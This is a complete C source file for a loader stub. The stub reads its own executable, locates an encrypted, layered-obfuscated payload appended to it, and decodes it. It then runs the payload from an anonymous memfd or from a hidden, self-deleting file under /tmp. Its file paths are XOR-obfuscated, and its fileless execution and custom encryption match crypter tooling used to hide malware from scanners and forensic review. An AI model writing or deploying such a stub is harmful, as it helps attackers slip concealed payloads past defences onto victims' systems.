#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/syscall.h>
#include <stdint.h>

#include "blz.h"
#include "blz_config.h"

#ifdef DEBUG
#define DBG(fmt, ...) fprintf(stderr, "[DBG] " fmt "\n", ##__VA_ARGS__)
#else
#define DBG(fmt, ...) do {} while(0)
#endif

#define FOOTER_SIZE 33

static const unsigned char OBF_PROC_SELF_EXE[] = {
    0x2F^BLZ_STR_KEY, 0x70^BLZ_STR_KEY, 0x72^BLZ_STR_KEY,
    0x6F^BLZ_STR_KEY, 0x63^BLZ_STR_KEY, 0x2F^BLZ_STR_KEY,
    0x73^BLZ_STR_KEY, 0x65^BLZ_STR_KEY, 0x6C^BLZ_STR_KEY,
    0x66^BLZ_STR_KEY, 0x2F^BLZ_STR_KEY, 0x65^BLZ_STR_KEY,
    0x78^BLZ_STR_KEY, 0x65^BLZ_STR_KEY, 0x00
};

static const unsigned char OBF_TMP_PREFIX[] = {
    0x2F^BLZ_STR_KEY, 0x74^BLZ_STR_KEY, 0x6D^BLZ_STR_KEY,
    0x70^BLZ_STR_KEY, 0x2F^BLZ_STR_KEY, 0x2E^BLZ_STR_KEY,
    0x62^BLZ_STR_KEY, 0x00
};

static const unsigned char OBF_VAR_TMP_PREFIX[] = {
    0x2F^BLZ_STR_KEY, 0x76^BLZ_STR_KEY, 0x61^BLZ_STR_KEY,
    0x72^BLZ_STR_KEY, 0x2F^BLZ_STR_KEY, 0x74^BLZ_STR_KEY,
    0x6D^BLZ_STR_KEY, 0x70^BLZ_STR_KEY, 0x2F^BLZ_STR_KEY,
    0x2E^BLZ_STR_KEY, 0x62^BLZ_STR_KEY, 0x00
};

static const unsigned char OBF_PROC_SELF_FD[] = {
    0x2F^BLZ_STR_KEY, 0x70^BLZ_STR_KEY, 0x72^BLZ_STR_KEY,
    0x6F^BLZ_STR_KEY, 0x63^BLZ_STR_KEY, 0x2F^BLZ_STR_KEY,
    0x73^BLZ_STR_KEY, 0x65^BLZ_STR_KEY, 0x6C^BLZ_STR_KEY,
    0x66^BLZ_STR_KEY, 0x2F^BLZ_STR_KEY, 0x66^BLZ_STR_KEY,
    0x64^BLZ_STR_KEY, 0x2F^BLZ_STR_KEY, 0x00
};

static void decode_str(const unsigned char *obf, char *out, int max) {
    int i = 0;
    while (obf[i] && i < max - 1) {
        out[i] = obf[i] ^ BLZ_STR_KEY;
        i++;
    }
    out[i] = '\0';
}

static void gen_suffix(char *buf, int len) {
    static const char set[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    uint32_t rng = (uint32_t)getpid() ^ (uint32_t)time(NULL);
    for (int i = 0; i < len; i++) {
        rng ^= rng << 13; rng ^= rng >> 17; rng ^= rng << 5;
        buf[i] = set[rng % (sizeof(set) - 1)];
    }
    buf[len] = '\0';
}

static inline uint32_t rotl32(uint32_t x, int k) {
    return (x << k) | (x >> (32 - k));
}

typedef struct { uint32_t s[4]; } xoshi_t;

static uint32_t xoshi_next(xoshi_t *x) {
    uint32_t result = rotl32(x->s[0] + x->s[3], 7) + x->s[0];
    uint32_t t = x->s[1] << 9;
    x->s[2] ^= x->s[0];
    x->s[3] ^= x->s[1];
    x->s[1] ^= x->s[2];
    x->s[0] ^= x->s[3];
    x->s[2] ^= t;
    x->s[3] = rotl32(x->s[3], 11);
    return result;
}

static void xoshi_seed(xoshi_t *x, const uint8_t seed[16]) {
    memcpy(x->s, seed, 16);
    for (int i = 0; i < 4; i++)
        x->s[i] ^= BLZ_XOSHI_INIT_XOR;
    if (x->s[0] == 0 && x->s[1] == 0 && x->s[2] == 0 && x->s[3] == 0)
        x->s[0] = BLZ_SEED_FALLBACK;
}

static void xoshi_xor_stream(char *data, int len, const uint8_t seed[16]) {
    xoshi_t st;
    xoshi_seed(&st, seed);
    int i = 0;
    while (i < len) {
        uint32_t r = xoshi_next(&st);
        for (int j = 0; j < 4 && i < len; j++, i++)
            data[i] ^= (r >> (j * 8)) & 0xFF;
    }
}

static void block_untranspose(char *data, int len, const uint8_t seed[16]) {
    int nblocks = len / 8;
    if (nblocks < 2) return;

    xoshi_t st;
    xoshi_seed(&st, seed);
    for (int i = 0; i < nblocks; i++) xoshi_next(&st);

    int *si = malloc((size_t)nblocks * sizeof(int));
    int *sj = malloc((size_t)nblocks * sizeof(int));
    if (!si || !sj) { free(si); free(sj); return; }

    int ns = 0;
    for (int i = nblocks - 1; i > 0; i--) {
        uint32_t r = xoshi_next(&st);
        si[ns] = i;
        sj[ns] = r % (i + 1);
        ns++;
    }

    char tmp[8];
    for (int k = ns - 1; k >= 0; k--) {
        if (si[k] != sj[k]) {
            memcpy(tmp, data + si[k] * 8, 8);
            memcpy(data + si[k] * 8, data + sj[k] * 8, 8);
            memcpy(data + sj[k] * 8, tmp, 8);
        }
    }
    free(si);
    free(sj);
}

static void delta_decode(char *data, int len) {
    uint32_t prev = 0;
    for (int i = 0; i + 3 < len; i += 4) {
        uint32_t delta;
        memcpy(&delta, data + i, 4);
        uint32_t val = delta + prev;
        prev = val;
        memcpy(data + i, &val, 4);
    }
}

static void byte_unmap(char *data, int len) {
    for (int i = 0; i < len; i++)
        data[i] = (char)BLZ_INV_SBOX[(uint8_t)data[i]];
}

static void derive_footer_key(const uint8_t seed[16], uint8_t key[8]) {
    for (int i = 0; i < 8; i++)
        key[i] = seed[i] ^ seed[i + 8] ^ (uint8_t)(i * BLZ_KD_MUL + BLZ_KD_ADD);
}

static void decrypt_footer_data(uint8_t *data, int len,
                                const uint8_t seed[16]) {
    uint8_t key[8];
    derive_footer_key(seed, key);
    for (int i = 0; i < len; i++)
        data[i] ^= key[i % 8];
}

static uint64_t compute_hmac(const uint8_t seed[16],
                             uint32_t comp_sz, uint32_t decomp_sz) {
    uint64_t h = 0;
    for (int i = 0; i < 16; i++)
        h = (h * BLZ_HMAC_BASE) + seed[i];
    h ^= (uint64_t)comp_sz;
    h = (h << BLZ_HMAC_ROT) | (h >> (64 - BLZ_HMAC_ROT));
    h ^= (uint64_t)decomp_sz;
    h *= BLZ_HMAC_MUL;
    h ^= h >> 32;
    h ^= BLZ_VERIFY_MAGIC;
    return h;
}

static long find_payload(int fd, uint32_t *comp_size, uint32_t *decomp_size,
                         uint8_t seed[16]) {
    struct stat st;
    if (fstat(fd, &st) != 0) return -1;
    if (st.st_size < FOOTER_SIZE) return -1;

    if (lseek(fd, st.st_size - FOOTER_SIZE, SEEK_SET) == (off_t)-1)
        return -1;

    uint8_t footer[FOOTER_SIZE];
    if (read(fd, footer, FOOTER_SIZE) != FOOTER_SIZE) return -1;

    memcpy(seed, footer, 16);
    uint8_t noise_len = footer[32];

    uint8_t enc_data[8];
    memcpy(enc_data, footer + 16, 8);
    decrypt_footer_data(enc_data, 8, seed);

    memcpy(comp_size, enc_data, 4);
    memcpy(decomp_size, enc_data + 4, 4);

    uint64_t stored_hmac;
    memcpy(&stored_hmac, footer + 24, 8);
    uint64_t expected = compute_hmac(seed, *comp_size, *decomp_size);
    if (stored_hmac != expected) {
        DBG("HMAC mismatch");
        return -1;
    }

    if (*comp_size == 0 || *decomp_size == 0 ||
        *comp_size > (uint32_t)st.st_size)
    {
        DBG("Invalid sizes (comp=%u, decomp=%u)", *comp_size, *decomp_size);
        return -1;
    }

    long offset = st.st_size - FOOTER_SIZE - (long)noise_len - (long)(*comp_size);
    if (offset < 0) {
        DBG("Negative offset (%ld)", offset);
        return -1;
    }

    DBG("Payload: off=%ld comp=%u decomp=%u noise=%u",
        offset, *comp_size, *decomp_size, noise_len);
    return offset;
}

#ifndef __NR_memfd_create
#  if defined(__x86_64__)
#    define __NR_memfd_create 319
#  elif defined(__i386__)
#    define __NR_memfd_create 356
#  elif defined(__arm__)
#    define __NR_memfd_create 385
#  elif defined(__aarch64__)
#    define __NR_memfd_create 279
#  elif defined(__mips__)
#    define __NR_memfd_create 5350
#  endif
#endif

static int sys_memfd(const char *name, unsigned int flags) {
#ifdef __NR_memfd_create
    return syscall(__NR_memfd_create, name, flags);
#else
    return -1;
#endif
}

int main(int argc, char **argv, char **envp) {
    DBG("=== Loader ===");

    char proc_path[32];
    decode_str(OBF_PROC_SELF_EXE, proc_path, sizeof(proc_path));

    int self_fd = open(proc_path, O_RDONLY);
    if (self_fd < 0) {
        if (argv[0]) self_fd = open(argv[0], O_RDONLY);
        if (self_fd < 0) return 1;
    }

    uint32_t comp_size = 0, decomp_size = 0;
    uint8_t seed[16];
    long payload_off = find_payload(self_fd, &comp_size, &decomp_size, seed);
    if (payload_off < 0) { close(self_fd); return 2; }

    char *input = malloc(comp_size);
    if (!input) { close(self_fd); return 3; }

    if (lseek(self_fd, payload_off, SEEK_SET) != payload_off) {
        free(input); close(self_fd); return 4;
    }
    if (read(self_fd, input, comp_size) != (ssize_t)comp_size) {
        free(input); close(self_fd); return 5;
    }
    close(self_fd);

    block_untranspose(input, (int)comp_size, seed);
    xoshi_xor_stream(input, (int)comp_size, seed);

    char *output = malloc(decomp_size);
    if (!output) { free(input); return 6; }

    int result = blz_unpack(input, output, (int)comp_size, (int)decomp_size);
    free(input);
    if (result < 0) {
        DBG("Decompress failed: %d", result);
        free(output);
        return 7;
    }

    byte_unmap(output, (int)decomp_size);
    delta_decode(output, (int)decomp_size);

    char mfd_name[16];
    gen_suffix(mfd_name, 8);

    int dest_fd = sys_memfd(mfd_name, MFD_CLOEXEC);
    int used_memfd = 1;
    char fd_path[64] = {0};

    if (dest_fd < 0) {
        used_memfd = 0;
        char tmp[64], sfx[12];
        gen_suffix(sfx, 8);

        decode_str(OBF_TMP_PREFIX, tmp, sizeof(tmp));
        strcat(tmp, sfx);
        dest_fd = open(tmp, O_RDWR | O_CREAT | O_TRUNC, 0700);
        if (dest_fd >= 0) {
            strncpy(fd_path, tmp, sizeof(fd_path) - 1);
        } else {
            decode_str(OBF_VAR_TMP_PREFIX, tmp, sizeof(tmp));
            strcat(tmp, sfx);
            dest_fd = open(tmp, O_RDWR | O_CREAT | O_TRUNC, 0700);
            if (dest_fd >= 0) {
                strncpy(fd_path, tmp, sizeof(fd_path) - 1);
            } else {
                free(output);
                return 8;
            }
        }
    }

    if (write(dest_fd, output, decomp_size) != (ssize_t)decomp_size) {
        free(output); close(dest_fd);
        if (!used_memfd && fd_path[0]) unlink(fd_path);
        return 9;
    }
    free(output);

    if (used_memfd) {
        fexecve(dest_fd, argv, envp);
    } else {
        unlink(fd_path);
        char ep[80];
        decode_str(OBF_PROC_SELF_FD, ep, sizeof(ep));
        char fdn[16];
        snprintf(fdn, sizeof(fdn), "%d", dest_fd);
        strcat(ep, fdn);
        execve(ep, argv, envp);
    }

    close(dest_fd);
    return 10;
}
